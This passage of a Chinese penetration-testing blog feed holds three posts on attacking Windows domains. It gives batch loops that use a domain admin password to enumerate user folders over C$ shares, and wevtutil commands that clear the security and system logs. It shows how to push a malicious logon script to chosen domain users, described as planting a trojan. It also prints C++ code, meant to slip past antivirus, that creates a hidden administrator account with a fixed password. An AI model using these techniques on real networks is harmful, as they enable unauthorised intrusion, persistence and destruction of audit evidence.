    <content type="html"><![CDATA[<p>之前见到有人在讨论<a href="https://www.t00ls.net/viewthread.php?tid=47649&amp;extra=&amp;page=1" target="_blank" rel="noopener">域内用户在域内的机器ip怎么查呢</a>，集思广益，结合答复及自己的观点，总结了以下内容。<br><a id="more"></a></p><h2 id="0x00-adfind-未实践"><a href="#0x00-adfind-未实践" class="headerlink" title="0x00 adfind(未实践)"></a>0x00 adfind(未实践)</h2><p>有时候管理员会设置域用户只可以登录指定的的域内计算机，使用adfind或者powerview导出域用户信息可以查看；<br><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">查看域内用户详细信息：</span><br><span class="line">adfind.exe -h DNS_SERVER_IP -sc <span class="string">u:</span>username(目标用户)</span><br><span class="line"></span><br><span class="line">查看域内所有用户详细信息：</span><br><span class="line">AdFind.exe -h DNS_SERVER_IP -sc <span class="string">u:</span>*</span><br><span class="line">详见：<span class="string">http:</span><span class="comment">//www.joeware.net/freetools/tools/adfind/usage.htm</span></span><br></pre></td></tr></table></figure></p><p>powerview在域内执行就可以。</p><h2 id="0x01-查看域内机器的用户目录文件夹"><a href="#0x01-查看域内机器的用户目录文件夹" class="headerlink" title="0x01 查看域内机器的用户目录文件夹"></a>0x01 查看域内机器的用户目录文件夹</h2><p>确定开机状态的计算机列表-建立连接-查看用户目录-断开连接，可以参考如下批处理：<br><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> /f "delims=" <span class="variable">%%i</span> <span class="keyword">in</span> (live.txt) <span class="keyword">DO</span> (</span><br><span class="line">        <span class="built_in">net</span> use \\<span class="variable">%%i</span>\C$ password /u:domain\domain_admins_user</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="keyword">errorlevel</span> <span class="number">1</span> (</span><br><span class="line">                <span class="keyword">for</span> /f "delims=" <span class="variable">%%j</span> <span class="keyword">in</span> ('<span class="built_in">dir</span> /od /b \\<span class="variable">%%i</span>\C$\users\') <span class="keyword">do</span> (</span><br><span class="line">                        <span class="built_in">echo</span> <span class="variable">%%i</span>:<span class="variable">%%j</span>&gt;&gt; test.log</span><br><span class="line">                )</span><br><span class="line">                <span class="built_in">net</span> use \\<span class="variable">%%i</span>\C$ /<span class="built_in">del</span></span><br><span class="line">        )</span><br><span class="line">)</span><br></pre></td></tr></table></figure></p><p>域管不用建立连接就可以访问域内计算机资源（未实践），因此以域管权限运行时可以参考如下批处理：<br><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> /f "delims=" <span class="variable">%%i</span> <span class="keyword">in</span> (live.txt) <span class="keyword">DO</span> (</span><br><span class="line">        <span class="keyword">for</span> /f "delims=" <span class="variable">%%j</span> <span class="keyword">in</span> ('<span class="built_in">dir</span> /od /b \\<span class="variable">%%i</span>\C$\users\') <span class="keyword">do</span> (</span><br><span class="line">                <span class="built_in">echo</span> <span class="variable">%%i</span>:<span class="variable">%%j</span>&gt;&gt; test.log</span><br><span class="line">        )</span><br><span class="line">)</span><br></pre></td></tr></table></figure></p><h2 id="0x02-域控日志"><a href="#0x02-域控日志" class="headerlink" title="0x02 域控日志"></a>0x02 域控日志</h2><p><code>wevtutil</code>为Windows 事件命令行实用程序，其导出的日志为evtx格式（即Windows日志本身的存储格式），可以使用Windows事件查看器分析，Crtl+F查找，或者不使用<code>epl</code>参数，直接重定向输出即可。<br><code>wevtutil</code>常用的场景是清理日志。<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wevtutil cl application</span><br><span class="line">wevtutil cl security</span><br><span class="line">wevtutil cl system</span><br><span class="line">wevtutil cl <span class="string">"windows powershell"</span></span><br></pre></td></tr></table></figure></p><p>而它也可作为筛选分析日志的工具。这里需要注意的几个ID分别为：4624（用户登陆成功）、4768、4776（用户账号验证成功）</p><font color="#0099ff" size="3">使用<code>wevtutil</code>结合python</font><ul><li><p>wevtutil</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wevtutil qe security /q:"Event[System[(EventID=<span class="number">4624</span> or EventID=<span class="number">4768</span> or EventID=<span class="number">4776</span>)]]" /f:text /<span class="built_in">rd</span>:true /c:<span class="number">1</span> &gt; EvtLogon.dat</span><br></pre></td></tr></table></figure></li><li><p>参数说明</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">qe:</span> 从日志或日志文件中查询事件；（默认xml格式显示）</span><br><span class="line"><span class="string">Security:</span> 指定安全事件的日志；</span><br><span class="line">/<span class="string">q:</span> 筛选规则，可以打开Windows事件查看器的筛选器配置筛选条件后转至XML复制筛选规则；</span><br><span class="line">/<span class="string">f:</span> 以text格式显示</span><br><span class="line">/<span class="string">rd:</span> 指定读取事件的方向</span><br><span class="line">/<span class="string">c:</span> 指定个数</span><br><span class="line">该命令其它参数参考wevtutil /?</span><br></pre></td></tr></table></figure></li><li><p>python</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -- coding:utf-8 --</span></span><br><span class="line"><span class="comment"># Python v2.7.10</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"></span><br><span class="line">evt = <span class="string">'EvtLogon.dat'</span></span><br><span class="line">fevt = open(evt,<span class="string">'r'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="comment"># For Eliminate redundancies</span></span><br><span class="line">    lastdate = <span class="string">'lastdate'</span></span><br><span class="line">    lasttask = <span class="string">'lasttask'</span></span><br><span class="line">    <span class="comment"># 因为windows下的换行符问题，导致写的文件会有空行，使用二进制模式打开</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'LogonStat.csv'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> csvfile:</span><br><span class="line">        csv_write = csv.writer(csvfile)</span><br><span class="line">        csv_write.writerow([<span class="string">"Task"</span>, <span class="string">"Date"</span>, <span class="string">"Account Name"</span>, <span class="string">"Account Domain"</span>, <span class="string">"Logon Address"</span>])</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> eachline <span class="keyword">in</span> fevt:</span><br><span class="line">            <span class="keyword">if</span> eachline.find(<span class="string">'Event['</span>) &gt; <span class="number">-1</span>:</span><br><span class="line">                task = <span class="string">''</span></span><br><span class="line">                date = <span class="string">''</span></span><br><span class="line">                accname = <span class="string">''</span></span><br><span class="line">                logontype = <span class="string">''</span></span><br><span class="line">                logonaddr = <span class="string">''</span></span><br><span class="line">                skip = <span class="number">0</span></span><br><span class="line">            <span class="keyword">elif</span> eachline.find(<span class="string">'Date:'</span>) &gt; <span class="number">-1</span>:</span><br><span class="line">                date = eachline[(eachline.find(<span class="string">':'</span>)+<span class="number">1</span>):].strip()</span><br><span class="line">            <span class="keyword">elif</span> eachline.find(<span class="string">'Task:'</span>) &gt; <span class="number">-1</span>:</span><br><span class="line">                task = eachline.split(<span class="string">':'</span>)[<span class="number">1</span>].strip()</span><br><span class="line">                <span class="keyword">if</span> (date == lastdate) <span class="keyword">and</span> (task == lasttask): <span class="comment">## reduce</span></span><br><span class="line">                    skip = <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    lastdate = date</span><br><span class="line">                    lasttask = task</span><br><span class="line">            <span class="keyword">elif</span> eachline.find(<span class="string">'Account Name:'</span>) &gt; <span class="number">-1</span>:</span><br><span class="line">                accname = eachline.split(<span class="string">':'</span>)[<span class="number">1</span>].strip()</span><br><span class="line">                <span class="keyword">if</span> (task == <span class="string">'Logon'</span>) <span class="keyword">and</span> (accname.find(<span class="string">'$'</span>) &gt; <span class="number">-1</span>): <span class="comment">## reduce</span></span><br><span class="line">                    skip = <span class="number">1</span></span><br><span class="line">            <span class="keyword">elif</span> eachline.find(<span class="string">'Account Domain:'</span>) &gt; <span class="number">-1</span>:</span><br><span class="line">                accdomain = eachline.split(<span class="string">':'</span>)[<span class="number">1</span>].strip()</span><br><span class="line">            <span class="keyword">elif</span> eachline.find(<span class="string">'Source Network Address:'</span>) &gt; <span class="number">-1</span>:</span><br><span class="line">                logonaddr = eachline[(eachline.find(<span class="string">':'</span>)+<span class="number">1</span>):].strip()</span><br><span class="line">                <span class="keyword">if</span> logonaddr == <span class="string">'-'</span>:</span><br><span class="line">                    skip = <span class="number">1</span></span><br><span class="line">                <span class="keyword">if</span> (skip == <span class="number">0</span>) <span class="keyword">and</span> (task == <span class="string">'Logon'</span>):</span><br><span class="line">                    LogonStat = [[task, date, accname, accdomain, logonaddr]]</span><br><span class="line">                    csv_write.writerows(LogonStat)</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="comment"># pass</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'Error: %s'</span> % e</span><br><span class="line">    sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">fevt.close()</span><br><span class="line">csvfile.close()</span><br></pre></td></tr></table></figure></li></ul><p>PS: 筛选条件还有很多，都可以组合利用，从而筛选出自己所需要的信息。<br><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wevtutil qe Security /q:"*[EventData[Data[@Name='LogonType']='<span class="number">10</span>'] and EventData[Data[@Name='TargetUserName']='RcoIl'] and System[(EventID=<span class="number">4624</span>) and TimeCreated[timediff(@SystemTime) &amp;lt;= <span class="number">2592000000</span>]]]"</span><br><span class="line"></span><br><span class="line">wevtutil qe Security /q:"*[System[(Keywords='<span class="number">0</span>x8020000000000000')] and EventData[Data[@Name='SubjectUserName']='RcoIl']]" /f:text /<span class="built_in">rd</span>:true /c:<span class="number">2</span></span><br></pre></td></tr></table></figure></p><h2 id="0x03-【参考】"><a href="#0x03-【参考】" class="headerlink" title="0x03 【参考】"></a>0x03 【参考】</h2><p><a href="http://cate4cafe.com/2018/11/21/wevtutil%E7%AD%9B%E9%80%89windows%E6%97%A5%E5%BF%97%E6%9F%A5%E8%AF%A2%E7%BB%93%E6%9E%9C/" target="_blank" rel="noopener">wevtutil筛选windows日志查询结果</a><br><a href="https://blog.csdn.net/dearggae/article/details/70147511" target="_blank" rel="noopener">[Tools]获取域环境内所有用户登录信息（附源码及程序）</a><br><a href="https://www.t00ls.net/viewthread.php?tid=47649&amp;extra=&amp;page=1" target="_blank" rel="noopener">域内用户在域内的机器ip怎么查呢？</a><br><a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/dd337721(v%3dws.10)" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/dd337721(v%3dws.10)</a><br><a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc732848(v=ws.11)" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc732848(v=ws.11)</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;之前见到有人在讨论&lt;a href=&quot;https://www.t00ls.net/viewthread.php?tid=47649&amp;amp;extra=&amp;amp;page=1&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;域内用户在域内的机器ip怎么查呢&lt;/a&gt;，集思广益，结合答复及自己的观点，总结了以下内容。&lt;br&gt;
    
    </summary>
    
      <category term="内网渗透" scheme="https://rcoil.me/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="内网渗透" scheme="https://rcoil.me/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
      <category term="域渗透" scheme="https://rcoil.me/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>【域渗透】在域控上使用cmd更改域用户配置文件中的登录脚本</title>
    <link href="https://rcoil.me/2018/11/%E3%80%90%E5%9F%9F%E6%B8%97%E9%80%8F%E3%80%91%E5%9C%A8%E5%9F%9F%E6%8E%A7%E4%B8%8A%E4%BD%BF%E7%94%A8cmd%E6%9B%B4%E6%94%B9%E5%9F%9F%E7%94%A8%E6%88%B7%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84%E7%99%BB%E5%BD%95%E8%84%9A%E6%9C%AC/"/>
    <id>https://rcoil.me/2018/11/【域渗透】在域控上使用cmd更改域用户配置文件中的登录脚本/</id>
    <published>2018-11-16T08:33:21.000Z</published>
    <updated>2018-12-14T06:36:44.982Z</updated>
    
    <content type="html"><![CDATA[<p><font color="#DC143C" size="3">摘要：</font>采取直接的手段不能够解决问题，只好曲线救国。<br><a id="more"></a><br>声明：只是作为搬运工。</p><h2 id="0x00-利用场景"><a href="#0x00-利用场景" class="headerlink" title="0x00 利用场景"></a>0x00 利用场景</h2><ul><li><p>利用前置条件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">域管理员权限</span><br></pre></td></tr></table></figure></li><li><p>使用场合</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">知道目标域用户名称，探测不到域用户对应机器名或<span class="built_in">IP</span>；</span><br><span class="line">知道目标机器<span class="built_in">IP</span>，但是无法通往上控；</span><br></pre></td></tr></table></figure></li></ul><h2 id="0x01-利用方法"><a href="#0x01-利用方法" class="headerlink" title="0x01 利用方法"></a>0x01 利用方法</h2><p><font color="#DC143C" size="3">PS：</font>以下测试全部在域控上执行</p><h3 id="一）使用dsmod给指定域用户设置登陆脚本"><a href="#一）使用dsmod给指定域用户设置登陆脚本" class="headerlink" title="一）使用dsmod给指定域用户设置登陆脚本"></a>一）使用dsmod给指定域用户设置登陆脚本</h3><p>test.bat放在域控的NETLOGON目录下面<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">copy test.bat \\域控\SYSVOL\sysvol\域名\SCRIPTS\test.bat</span><br><span class="line">dsmod<span class="built_in"> user </span>-loscr <span class="string">"test.bat"</span> <span class="string">"CN=x,OU=x,DC=x,DC=x,DC=x"</span></span><br></pre></td></tr></table></figure></p><p>测试结果：<br>PS: 测试机为<code>Win-XP x86</code>，第二次注销重新登陆bat脚本才执行，bat内容为<a href="mailto:`@calc.exe" target="_blank" rel="noopener">`@calc.exe</a>`。<br><img src="/image/在域控上使用cmd更改域用户配置文件中的登录脚本/blog_2018-11-16_18-18-23.png" alt=""></p><h3 id="二）登陆脚本给指定用户种马"><a href="#二）登陆脚本给指定用户种马" class="headerlink" title="二）登陆脚本给指定用户种马"></a>二）登陆脚本给指定用户种马</h3><p>test.bat放在域控的NETLOGON目录下面<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">copy test.bat \\域控\SYSVOL\sysvol\域名\SCRIPTS\test.bat</span><br><span class="line">net<span class="built_in"> user </span>xp /scriptpath:test.bat # 内网域成员机器可以使用</span><br><span class="line">gpupdate /force  # 立即刷新组策略 使用域管权限执行  不执行也行,等待随机</span><br></pre></td></tr></table></figure></p><p>测试结果与第一种方法一致</p><h3 id="三）使用PowerShell的Active-Directory模块"><a href="#三）使用PowerShell的Active-Directory模块" class="headerlink" title="三）使用PowerShell的Active Directory模块"></a>三）使用PowerShell的Active Directory模块</h3><p><code>ActiveDirectory.psd1</code>项目：<a href="https://github.com/samratashok/ADModule" target="_blank" rel="noopener">ADModule</a><br>命令：<br><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Import</span>-<span class="keyword">Module</span> ActiveDirectory.psd1; 或者<span class="keyword">Import</span>-<span class="keyword">Module</span> Microsoft.ActiveDirectory.Management.dll</span><br><span class="line"><span class="keyword">Set</span>-ADUser -<span class="keyword">Identity</span> AD_USER -ProfilePath <span class="string">"filepath"</span> -ScriptPath <span class="string">"filename"</span></span><br></pre></td></tr></table></figure></p><p>参数说明</p><ul><li><p>Identity<br>通过提供以下属性值之一指定Active Directory用户对象。括号中的标识符是属性的LDAP显示名称。此参数的可接受值为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">一个名字</span><br><span class="line">GUID（objectGUID）</span><br><span class="line">安全标识符（objectSid）</span><br><span class="line">SAM帐户名称（sAMAccountName）</span><br></pre></td></tr></table></figure></li><li><p>ProfilePath<br>指定用户配置文件的路径。该值可以是本地绝对路径或通用命名约定（UNC）路径。</p></li><li>ScriptPath<br>指定用户登录脚本的路径。该值可以是本地绝对路径或通用命名约定（UNC）路径。</li></ul><p>测试结果与第一种方法一致</p><h2 id="0x02-参考"><a href="#0x02-参考" class="headerlink" title="0x02 参考"></a>0x02 参考</h2><p><a href="http://cate4cafe.com/2018/11/17/%E8%AE%BE%E7%BD%AE%E5%9F%9F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E8%84%9A%E6%9C%AC/" target="_blank" rel="noopener">http://cate4cafe.com/2018/11/17/%E8%AE%BE%E7%BD%AE%E5%9F%9F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E8%84%9A%E6%9C%AC/</a><br><a href="https://www.t00ls.net/thread-48540-1-1.html" target="_blank" rel="noopener">https://www.t00ls.net/thread-48540-1-1.html</a><br><a href="https://www.labofapenetrationtester.com/2018/10/domain-enumeration-from-PowerShell-CLM.html" target="_blank" rel="noopener">https://www.labofapenetrationtester.com/2018/10/domain-enumeration-from-PowerShell-CLM.html</a><br><a href="https://docs.microsoft.com/en-us/powershell/module/addsadministration/Set-ADUser?view=win10-ps" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/powershell/module/addsadministration/Set-ADUser?view=win10-ps</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;font color=&quot;#DC143C&quot; size=&quot;3&quot;&gt;摘要：&lt;/font&gt;采取直接的手段不能够解决问题，只好曲线救国。&lt;br&gt;
    
    </summary>
    
      <category term="内网渗透" scheme="https://rcoil.me/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="内网渗透" scheme="https://rcoil.me/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
      <category term="域渗透" scheme="https://rcoil.me/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>【C++】创建用户，并添加至管理组</title>
    <link href="https://rcoil.me/2018/11/%E3%80%90C-%E3%80%91%E5%88%9B%E5%BB%BA%E7%94%A8%E6%88%B7%EF%BC%8C%E5%B9%B6%E6%B7%BB%E5%8A%A0%E8%87%B3%E7%AE%A1%E7%90%86%E7%BB%84/"/>
    <id>https://rcoil.me/2018/11/【C-】创建用户，并添加至管理组/</id>
    <published>2018-11-15T03:52:27.000Z</published>
    <updated>2018-11-17T16:49:28.274Z</updated>
    
    <content type="html"><![CDATA[<p>摘要: 因有些需求，需要本地/远程添加用户。所以直接选择<code>Windows API函数</code>进行编写，因为部分杀软限制了<code>CMD</code>。<br><a id="more"></a><br><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">程序名称：添加系统用户.exe(也可创建dll)</span><br><span class="line">编译平台：VS<span class="number">2015</span> C# (.NET Framework v<span class="number">4.0</span>)、Windows <span class="number">7</span> Ultimate <span class="keyword">x</span><span class="number">64</span></span><br><span class="line">编写语言：C++ (C#存在版本限制)</span><br><span class="line">测试条件：以管理员运行</span><br><span class="line">测试工具：zzz_exploit <span class="keyword">or</span> other</span><br><span class="line">测试平台：xp-<span class="keyword">x</span><span class="number">64</span>、win<span class="number">2003</span>-<span class="keyword">x</span><span class="number">86</span>、win<span class="number">7</span>-<span class="keyword">x</span><span class="number">64</span>、win<span class="number">2008</span>-<span class="keyword">x</span><span class="number">64</span>、win<span class="number">10</span>-<span class="keyword">x</span><span class="number">64</span>(火绒) --&gt;均可成功添加</span><br></pre></td></tr></table></figure></p><h2 id="0x00-思路及原理"><a href="#0x00-思路及原理" class="headerlink" title="0x00 思路及原理"></a>0x00 思路及原理</h2><h3 id="一）编程思路"><a href="#一）编程思路" class="headerlink" title="一）编程思路"></a>一）编程思路</h3><p>使用<a href="https://docs.microsoft.com/en-us/windows/desktop/api/lmaccess/nf-lmaccess-netuseradd" target="_blank" rel="noopener">NetUserAdd函数</a>添加普通权限的用户并指定级别。<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NET_API_STATUS NET_API_FUNCTION <span class="title">NetUserAdd</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  LPCWSTR servername, <span class="comment">// 指向常量字符串的指针，该字符串是要指定远程服务器的DNS或NetBIOS名称来执行该函数。如果此参数为NULL，则使用本地计算机</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD   level, <span class="comment">// 指定数据的信息级别。</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPBYTE  buf, <span class="comment">// 指向指定数据的缓冲区的指针。此数据的格式取决于level参数的值。</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPDWORD parm_err</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure></p><p>使用<a href="https://docs.microsoft.com/en-us/windows/desktop/api/lmaccess/nf-lmaccess-netlocalgroupaddmembers" target="_blank" rel="noopener">NetLocalGroupAddMembers函数</a>将现有用户账号添加到现有本地组。<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NET_API_STATUS NET_API_FUNCTION <span class="title">NetLocalGroupAddMembers</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  LPCWSTR servername, <span class="comment">// 指向常量字符串的指针，该字符串是要指定远程服务器的DNS或NetBIOS名称来执行该函数。如果此参数为NULL，则使用本地计算机</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPCWSTR groupname, <span class="comment">// 指向常量字符串的指针，该字符串指定将向其添加指定用户或全局组的本地组的名称。</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD   level, <span class="comment">// 指定数据的信息级别。</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPBYTE  buf, <span class="comment">// 指向包含新本地组成员数据的缓冲区的指针。此数据的格式取决于level参数的值。</span></span></span></span><br><span class="line"><span class="function"><span class="params">  DWORD   totalentries <span class="comment">// 指定buf参数指向的缓冲区中的条目数。</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure></p><h3 id="二）编写思路"><a href="#二）编写思路" class="headerlink" title="二）编写思路"></a>二）编写思路</h3><ul><li>定义USER_INFO_1 结构体<br>该结构包含用户的账户信息，包括账户名，密码数据，权限级别和路径到用户的主目录。</li><li>调用NetUserAdd添加普通权限账户</li><li>调用NetLocalGroupAddMembers添加到管理员组</li></ul><h2 id="0x01-代码"><a href="#0x01-代码" class="headerlink" title="0x01 代码"></a>0x01 代码</h2><h3 id="一）exe生成"><a href="#一）exe生成" class="headerlink" title="一）exe生成"></a>一）exe生成</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// UserInfoAdd.cpp : 定义控制台应用程序的入口点。</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdafx.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> UNICODE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UNICODE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib,<span class="meta-string">"netapi32"</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span>  <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span>  <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span>  <span class="meta-string">&lt;lm.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">wmain</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">wchar_t</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 定义USER_INFO_1结构体</span></span><br><span class="line">USER_INFO_1 UserInfo;</span><br><span class="line">DWORD dwLevel = <span class="number">1</span>;</span><br><span class="line">DWORD dwError = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">UserInfo.usri1_name = <span class="string">L"Admins"</span>;            <span class="comment">// 账户    </span></span><br><span class="line">UserInfo.usri1_password = <span class="string">L"P@ssword233"</span>;      <span class="comment">// 密码</span></span><br><span class="line">UserInfo.usri1_priv = USER_PRIV_USER;</span><br><span class="line">UserInfo.usri1_home_dir = <span class="literal">NULL</span>;</span><br><span class="line">UserInfo.usri1_comment = <span class="literal">NULL</span>;</span><br><span class="line">UserInfo.usri1_flags = UF_SCRIPT;</span><br><span class="line">UserInfo.usri1_script_path = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//添加名为Admins的用户,密码为P@ssword233 </span></span><br><span class="line">NetUserAdd(<span class="literal">NULL</span>, dwLevel, (LPBYTE)&amp;UserInfo, &amp;dwError);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加用户到administrators组</span></span><br><span class="line">LOCALGROUP_MEMBERS_INFO_3 account;</span><br><span class="line">account.lgrmi3_domainandname = UserInfo.usri1_name;</span><br><span class="line">NetLocalGroupAddMembers(<span class="literal">NULL</span>, <span class="string">L"Administrators"</span>, <span class="number">3</span>, (LPBYTE)&amp;account, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span 